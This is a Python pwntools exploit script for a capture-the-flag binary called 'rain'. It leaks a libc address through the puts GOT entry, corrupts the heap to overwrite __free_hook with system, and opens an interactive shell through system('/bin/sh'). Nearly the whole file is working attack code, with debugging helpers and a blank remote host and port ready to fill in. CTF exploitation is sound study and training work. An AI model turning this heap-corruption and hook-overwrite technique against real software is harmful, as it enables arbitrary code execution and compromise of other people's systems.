# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './rain'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def set(a,b,c,d,e,f):
    cmd(1)
    pay=p32(a)+p32(b)+p8(c)+p8(d)+p32(e)
    pay+=f
    sa('FRAME> ',pay)

def show():
    cmd(2)

def rain():
    cmd(3)

# one_gad = one_gadget(libc.path)

def attack():
    

    set(0x20,0x20,1,1,1,'a'*0x44)
    set(0x20,0x20,1,1,1,'aaaa') # free
    set(0x20,0x20,1,1,1,'aaaa') # free
    rain()

    pay='\x00'*0x28
    pay+=p64(0x400E17)
    pay+=p64(elf.got['puts'])+'\x00'

    set(0,0,1,1,1,'a'*4+pay)
    show()

    libc.address = l64() - libc.sym['puts']
    binsh_addr=libc.search('/bin/sh\x00').next()
    system_addr=libc.sym['system']
    free_hook_addr=libc.sym['__free_hook']

    set(0x20,0x20,1,1,1,'a'*0x64)
    set(0x20,0x20,1,1,1,'a'*0x14)
    set(0x20,0x20,1,1,1,'a'*4)
    set(0x20,0x20,1,1,1,'a'*4)
    set(0x20,0x20,1,1,1,'aaaa'+p64(free_hook_addr-8))

    rain()
    set(0x20,0x20,1,1,1,'aaaa'+p64(free_hook_addr-8))
    rain()
    set(0x20,0x20,1,1,1,'aaaa/bin/sh\x00'+p64(system_addr))
    set(0x20,0x20,1,1,1,'aaaa')

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   rain.py
@Time    :   2022/02/27 14:30:15
@Author  :   Niyah 
'''